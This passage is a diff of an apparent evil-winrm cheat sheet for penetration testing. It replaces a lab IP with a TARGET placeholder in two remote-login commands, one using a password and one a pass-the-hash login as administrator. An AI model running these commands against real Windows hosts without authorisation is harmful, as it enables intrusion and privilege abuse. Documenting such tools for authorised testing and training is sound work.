@@ -33,13 +33,13 @@ Inside the session: `upload local remote`, `download remote local`, `menu` (list
 Connect with a password:
 
 ```bash
-evil-winrm -i 10.10.10.5 -u jsmith -p 'Winter2026!'
+evil-winrm -i TARGET -u jsmith -p 'Winter2026!'
 ```
 
 Pass-the-hash (no password needed):
 
 ```bash
-evil-winrm -i 10.10.10.5 -u administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0
+evil-winrm -i TARGET -u administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0
 ```
 
 Upload a file from the session:
